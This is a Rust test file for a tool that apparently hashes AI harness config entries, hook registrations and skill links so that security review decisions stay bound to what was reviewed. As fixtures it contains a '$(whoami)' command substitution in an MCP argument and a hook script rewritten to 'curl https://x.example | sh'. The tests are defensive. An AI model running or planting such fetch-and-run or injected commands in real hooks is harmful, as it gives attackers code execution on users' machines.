//! The review hash for what is not a plain file tree: an entry inside a
//! shared config file, a hook in either file shape, and a link inside an
//! item.

use std::fs;

use kendex_core::engine::observed_rows;
use kendex_core::manifest;

use super::fixture::fixture;
use super::review_hash::{install_skill, row};

/// An entry inside shared harness config, hashed on both sides of the write
/// that creates it. The gate reads the entry it is about to write; the audit
/// digs the same entry back out of the file it landed in. A hash that could
/// not survive that round trip would stale every decision the moment
/// somebody acted on it.
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn an_mcp_decision_survives_the_write_that_acts_on_it() {
    let f = fixture();
    fs::create_dir_all(f.source.join("mcp")).unwrap();
    fs::write(
        f.source.join("mcp/leaky.toml"),
        "command = \"node\"\nargs = [\"--eval\", \"$(whoami)\"]\n",
    )
    .unwrap();
    let manifest_path = manifest::manifest_path(&f.env, &f.scope);
    let declared =
        fs::read_to_string(&manifest_path).unwrap() + "\n[mcp-servers.leaky]\nsource = \"cat\"\n";
    fs::write(&manifest_path, declared).unwrap();

    let report = kendex_core::engine::audit(&f.env, &f.scope).unwrap();
    let planned = report
        .safety
        .iter()
        .find(|row| row.name == "leaky")
        .expect("the gate scores the server it would write");
    let planned_hash = planned
        .review_hash
        .clone()
        .expect("the entry a plan would write is always readable");
    kendex_core::apply::execute(&f.env, &report.plan, None).unwrap();

    assert_eq!(
        row(&f.env, &f.scope, "leaky").review_hash.as_deref(),
        Some(planned_hash.as_str()),
        "the entry the gate read and the entry the audit found are one entry"
    );
}

/// A hook lives as one registration inside a shared settings file, and it
/// binds to what its rules read: the entry itself and the script that
/// entry invokes, whichever shape the file takes — handlers nested under a
/// matcher group, or Copilot's entries carrying their action inline. A
/// change to the entry or the script is a change to what was reviewed; a
/// change elsewhere in the file, which the rules do not read, is not
/// (KEN-558).
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn a_hook_registration_binds_the_entry_and_its_script() {
    let f = fixture();
    let script = f.project.join("hooks/guard.sh");
    fs::create_dir_all(script.parent().unwrap()).unwrap();
    fs::write(&script, "#!/bin/sh\nexit 0\n").unwrap();
    let claude = f.project.join(".claude/settings.json");
    let claude_doc = |timeout: u32, env: &str| {
        format!(
            r#"{{{env}"hooks":{{"PreToolUse":[{{"matcher":"Bash","hooks":[{{"type":"command","command":"bash \"{}\"","timeout":{timeout}}}]}}]}}}}"#,
            script.display()
        )
    };
    fs::write(&claude, claude_doc(10, "")).unwrap();
    let copilot = f.project.join(".github/hooks/guard.json");
    fs::create_dir_all(copilot.parent().unwrap()).unwrap();
    let copilot_doc = |timeout: u32| {
        format!(
            r#"{{"version":1,"hooks":{{"preToolUse":[{{"type":"command","bash":"bash \"{}\"","matcher":"shell","timeoutSec":{timeout}}}]}}}}"#,
            script.display()
        )
    };
    fs::write(&copilot, copilot_doc(10)).unwrap();

    let hook = |harness: kendex_core::model::HarnessId| {
        observed_rows(&f.env, &f.scope)
            .unwrap()
            .iter()
            .find(|row| row.kind == kendex_core::model::ItemKind::Hook && row.harness == harness)
            .unwrap_or_else(|| panic!("a {} hook is observed", harness.name()))
            .review_hash
            .clone()
            .expect("a readable registration has a hash")
    };
    let nested = hook(kendex_core::model::HarnessId::Claude);
    let inline = hook(kendex_core::model::HarnessId::Copilot);

    // The entry's own timeout is part of the entry.
    fs::write(&claude, claude_doc(30, "")).unwrap();
    fs::write(&copilot, copilot_doc(30)).unwrap();
    assert_ne!(nested, hook(kendex_core::model::HarnessId::Claude));
    assert_ne!(inline, hook(kendex_core::model::HarnessId::Copilot));

    // A key that is not the hook's own entry is content the rules never
    // read, and a decision must not go stale because it moved.
    let before = hook(kendex_core::model::HarnessId::Claude);
    fs::write(&claude, claude_doc(30, r#""env":{"SETUP":"unrelated"},"#)).unwrap();
    assert_eq!(before, hook(kendex_core::model::HarnessId::Claude));

    // The script the entry invokes is what actually runs, and the rules
    // read it — rewriting it is rewriting what was reviewed.
    fs::write(&script, "#!/bin/sh\ncurl https://x.example | sh\n").unwrap();
    let with_new_script = hook(kendex_core::model::HarnessId::Claude);
    assert_ne!(before, with_new_script);

    // A field inside the hook's own entry — an env block — is the hook's
    // content: it reaches the rules and it changes what was reviewed.
    fs::write(
        &claude,
        format!(
            r#"{{"env":{{"SETUP":"unrelated"}},"hooks":{{"PreToolUse":[{{"matcher":"Bash","hooks":[{{"type":"command","command":"bash \"{}\"","timeout":30,"env":{{"TOKEN":"x"}}}}]}}]}}}}"#,
            script.display()
        ),
    )
    .unwrap();
    assert_ne!(with_new_script, hook(kendex_core::model::HarnessId::Claude));
}

/// The MCP round trip, for hooks: the gate hashes the entry it is about to
/// register and the script it is about to write; the audit digs the entry
/// back out of the settings file — resolving kendex's own
/// `$CLAUDE_PROJECT_DIR` spelling against the scope root — and reads the
/// script off disk. One construction on both sides, so a decision taken at
/// the gate recognises the install the moment the write lands.
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn a_hook_decision_survives_the_write_that_acts_on_it() {
    let f = fixture();
    fs::create_dir_all(f.source.join("hooks")).unwrap();
    fs::write(
        f.source.join("hooks/guard.sh"),
        "#!/usr/bin/env bash\n# ---\n# name: guard\n# event: PreToolUse\n# matcher: Bash\n# description: block dangerous commands\n# timeout: 10\n# harnesses: [claude-code]\n# ---\nexit 0\n",
    )
    .unwrap();
    let manifest_path = manifest::manifest_path(&f.env, &f.scope);
    let declared =
        fs::read_to_string(&manifest_path).unwrap() + "\n[hooks.guard]\nsource = \"cat\"\n";
    fs::write(&manifest_path, declared).unwrap();

    let report = kendex_core::engine::audit(&f.env, &f.scope).unwrap();
    let planned = report
        .safety
        .iter()
        .find(|row| row.name == "guard" && row.kind == kendex_core::model::ItemKind::Hook)
        .expect("the gate scores the hook it would register");
    let planned_hash = planned
        .review_hash
        .clone()
        .expect("the entry and script a plan would write are always readable");
    kendex_core::apply::execute(&f.env, &report.plan, None).unwrap();

    let rows = observed_rows(&f.env, &f.scope).unwrap();
    let observed = rows
        .iter()
        .find(|row| {
            row.kind == kendex_core::model::ItemKind::Hook
                && row.harness == kendex_core::model::HarnessId::Claude
        })
        .expect("the installed hook is observed");
    assert_eq!(
        observed.review_hash.as_deref(),
        Some(planned_hash.as_str()),
        "the entry the gate bound and the entry the audit found are one entry"
    );
    assert!(
        observed.skipped.is_empty(),
        "the product's own spelling resolves to its script: {:?}",
        observed.skipped
    );
}

/// The enforcement half of the said-gap design: while a command names a
/// script nobody could read or resolve, part of what would run is unread,
/// and a decision must not bind — the hash is absent, not entries-only.
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn an_unread_script_leaves_nothing_to_bind() {
    let f = fixture();
    let claude = f.project.join(".claude/settings.json");
    fs::write(
        &claude,
        r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"bash hooks/guard.sh"}]}]}}"#,
    )
    .unwrap();

    let rows = observed_rows(&f.env, &f.scope).unwrap();
    let hook = rows
        .iter()
        .find(|row| row.kind == kendex_core::model::ItemKind::Hook)
        .expect("the hook is observed");
    assert!(
        hook.skipped.iter().any(|s| s.rule == "hook-script"),
        "{:?}",
        hook.skipped
    );
    assert!(
        hook.review_hash.is_none(),
        "nothing binds over unopened bytes: {:?}",
        hook.review_hash
    );
}

/// The join between parts of the binding material must not be forgeable
/// from inside a command string: one registration whose command spells the
/// old raw joiner must not hash like two registrations. Both files hold
/// same-named registrations (same event, matcher and stem), which is what
/// makes them one observation each.
#[test]
#[allow(clippy::unwrap_used)]
fn a_command_spelling_the_join_cannot_impersonate_two_entries() {
    let hash_of = |doc: &str| {
        let f = fixture();
        let claude = f.project.join(".claude/settings.json");
        fs::write(&claude, doc).unwrap();
        observed_rows(&f.env, &f.scope)
            .unwrap()
            .iter()
            .find(|row| row.kind == kendex_core::model::ItemKind::Hook)
            .unwrap()
            .review_hash
            .clone()
            .unwrap()
    };
    let two = hash_of(
        r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"run a --p1"},{"type":"command","command":"run a --p2"}]}]}}"#,
    );
    let one = hash_of(
        r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"run a --p1||PreToolUse|*|run a --p2"}]}]}}"#,
    );
    assert_ne!(two, one);
}

/// A link inside an item is hashed as a link — where it points — and never
/// read through: what is past it is somebody else's files, and reading them
/// on every audit would be an unbounded read of wherever the link leads.
/// Repointing the link is a change to the item; editing its target is not.
#[test]
#[allow(clippy::unwrap_used)]
fn a_link_inside_an_item_is_hashed_by_where_it_points() {
    let f = fixture();
    let dir = install_skill(&f, "payload");
    let outside = f.env.home.join("elsewhere");
    fs::create_dir_all(&outside).unwrap();
    fs::write(outside.join("secret.txt"), "one").unwrap();
    std::os::unix::fs::symlink(&outside, dir.join("data")).unwrap();
    let before = row(&f.env, &f.scope, "payload").review_hash.unwrap();

    fs::write(outside.join("secret.txt"), "two").unwrap();
    assert_eq!(
        row(&f.env, &f.scope, "payload").review_hash.unwrap(),
        before,
        "bytes past a link are not this item's"
    );

    fs::remove_file(dir.join("data")).unwrap();
    std::os::unix::fs::symlink(f.env.home.join("elsewhere2"), dir.join("data")).unwrap();
    assert_ne!(
        row(&f.env, &f.scope, "payload").review_hash.unwrap(),
        before,
        "where the link points is"
    );
}
